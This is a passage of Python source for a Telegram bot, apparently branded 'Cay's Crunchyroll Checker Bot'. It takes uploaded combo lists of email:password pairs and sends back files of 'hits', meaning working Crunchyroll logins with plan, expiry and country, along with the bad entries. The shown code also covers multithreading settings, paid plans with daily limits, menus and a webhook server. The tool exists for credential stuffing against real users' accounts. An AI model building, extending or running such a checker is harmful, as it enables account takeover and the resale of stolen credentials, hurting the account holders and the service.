        hits_text = "EMAIL:PASSWORD | PLAN | EXPIRY | COUNTRY\n" + "="*60 + "\n"
        for hit in hits:
            hits_text += f"{hit['email']}:{hit['password']} | {hit['plan']} | {hit['expiry']} | {hit['country']}\n"
        
        hits_file = f"/tmp/crunchy_hits_{timestamp}.txt"
        with open(hits_file, "w", encoding="utf-8") as f:
            f.write(hits_text)
        
        await update.message.reply_document(
            document=open(hits_file, "rb"),
            filename=f"crunchy_hits_{datetime.now().strftime('%Y%m%d_%H%M')}.txt",
            caption=f"🎉 <b>{hits_count} HIT(S) FOUND!</b>\n\nChecked with {user_threads} threads.",
            parse_mode='HTML'
        )

    # 2. Send BAD file (always sent when there are bad accounts)
    if bad_count > 0:
        bad_text = "EMAIL:PASSWORD | STATUS\n" + "="*40 + "\n"
        
        # Fast lookup for hits
        hit_emails = {hit['email'] for hit in hits}
        
        for email, pwd in accounts:
            status = "HIT" if email in hit_emails else "BAD"
            bad_text += f"{email}:{pwd} | {status}\n"
        
        bad_file = f"/tmp/crunchy_bad_{timestamp}.txt"
        with open(bad_file, "w", encoding="utf-8") as f:
            f.write(bad_text)
        
        await update.message.reply_document(
            document=open(bad_file, "rb"),
            filename=f"crunchy_bad_{datetime.now().strftime('%Y%m%d_%H%M')}.txt",
            caption=f"❌ <b>{bad_count} BAD accounts</b>\n\nTotal checked: {total} | Threads: {user_threads}",
            parse_mode='HTML'
        )

async def edit_to_main_menu(update_or_query, context):
    context.user_data['in_main_menu'] = True
    """Smart function that works for BOTH callback buttons and normal messages"""
    # ←←← IMPORTANT: Clear waiting state when returning to main menu
    if 'waiting_for_threads' in context.user_data:
        context.user_data['waiting_for_threads'] = False

    stats = get_user_stats()
    limits = get_plan_limits(stats)
    
    keyboard = [
        [
            InlineKeyboardButton("📊 My Stats", callback_data="menu_stats"),
            InlineKeyboardButton("🔗 My Referrals", callback_data="menu_referrals")
        ],
        [
            InlineKeyboardButton("🎁 Rewards & Gifts", callback_data="menu_rewards"),
            InlineKeyboardButton("💎 Membership", callback_data="menu_membership")
        ],
        [
            InlineKeyboardButton("📞 Support", callback_data="menu_support"),
            InlineKeyboardButton("⚙️ Settings", callback_data="menu_settings")
        ]
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome = f"""
<b>𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗖𝗔𝗬'𝗦 • 𝗖𝗥𝗨𝗡𝗖𝗛𝗬𝗥𝗢𝗟𝗟 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗕𝗢𝗧</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
📤 <b>Send your combo list (.txt file)</b>
<i>Format: mail:pass (one per line)</i>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊<b>Your Dashboard:</b>
🧵 Threads: <code><b>{limits['current_threads']}/{limits['max_threads']}</b></code>
👑 Plan: <code><b>{limits['display_name']}</b></code>
📅 Days Left: <code><b>{get_days_remaining(stats['expires'])}</b></code>
📈 Daily Limit: <code><b>{limits['remaining_text']} lines</b></code>
📡 Mode: <code>{stats['mode']}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>👇 Select an option from the menu below:</b>
"""
    
    if hasattr(update_or_query, 'callback_query') and update_or_query.callback_query is not None:
        query = update_or_query.callback_query
        await query.edit_message_text(welcome, parse_mode='HTML', reply_markup=reply_markup)
    else:
        await update_or_query.message.reply_text(welcome, parse_mode='HTML', reply_markup=reply_markup)

async def manage_result_pin(update: Update, context: CallbackContext, message_id: int):
    """Unpin previous result and pin the new one (keeps only latest result pinned)"""
    chat_id = update.effective_chat.id
    
    # Unpin old result if exists (prevents chat clutter)
    old_id = context.user_data.get('last_pinned_result_id')
    if old_id:
        try:
            await context.bot.unpin_chat_message(chat_id=chat_id, message_id=old_id)
        except:
            pass  # already deleted or error
    
    # Pin the new result
    try:
        await context.bot.pin_chat_message(
            chat_id=chat_id,
            message_id=message_id,
            disable_notification=True
        )
        context.user_data['last_pinned_result_id'] = message_id
    except Exception as e:
        print(f"⚠️ Failed to pin result: {e}")

async def button_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()

    if not is_owner(update):
        await query.edit_message_text("❌ Access Denied.")
        return

    data = query.data

    if data == "menu_stats":
            context.user_data['in_main_menu'] = False
            await show_statistics_menu(query, context)
    
    elif data == "menu_referrals":
        context.user_data['in_main_menu'] = False
        text = "<b>🔗 My Referrals</b>\n\nYour referral link:\n<code>https://t.me/yourbot?start=ref123</code>\n\nReferrals: 0"
        await query.edit_message_text(text, parse_mode='HTML', reply_markup=query.message.reply_markup)
    
    elif data == "menu_rewards":
        context.user_data['in_main_menu'] = False
        text = "<b>🎁 Rewards & Gifts</b>\n\nNo rewards available yet.\nKeep using the bot to earn!"
        await query.edit_message_text(text, parse_mode='HTML', reply_markup=query.message.reply_markup)
    
    elif data == "menu_membership":
        context.user_data['in_main_menu'] = False
        await show_membership_menu(query, context)
    
    elif data == "menu_settings":
        context.user_data['in_main_menu'] = False
        await show_settings_menu(query, context)
    
    elif data == "set_threads":
        context.user_data['in_main_menu'] = False
        await handle_set_threads(query, context)
    
    elif data == "set_api_mode":
        context.user_data['in_main_menu'] = False
        await handle_api_mode(query, context)
    
    elif data == "back_to_main":
        await edit_to_main_menu(update, context)
    
    elif data == "menu_support":
        context.user_data['in_main_menu'] = False
        await show_support_menu(query, context)
    
    else:
        text = "Unknown option"
        await query.edit_message_text(text, parse_mode='HTML')

# Register handlers
tg_app.add_handler(CommandHandler("start", start))
tg_app.add_handler(CommandHandler("setplan", set_plan_command))
tg_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
tg_app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
tg_app.add_handler(CallbackQueryHandler(button_callback))

# ============== WEBHOOK ENDPOINT ==============
@app.post("/webhook")
async def webhook(request: Request):
    try:
        data = await request.json()
        update = Update.de_json(data, tg_app.bot)
        
        # Process update safely
        await tg_app.process_update(update)
        return {"status": "ok"}
    
    except Exception as e:
        print(f"❌ Webhook error: {e}")
        # Still return 200 so Telegram stops retrying
        return {"status": "error"}
    
# Optional: Health check
@app.get("/webhook")
async def webhook_get():
    return {
        "status": "✅ Webhook is Active",
        "info": "Telegram uses POST requests only. This is normal."
    }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)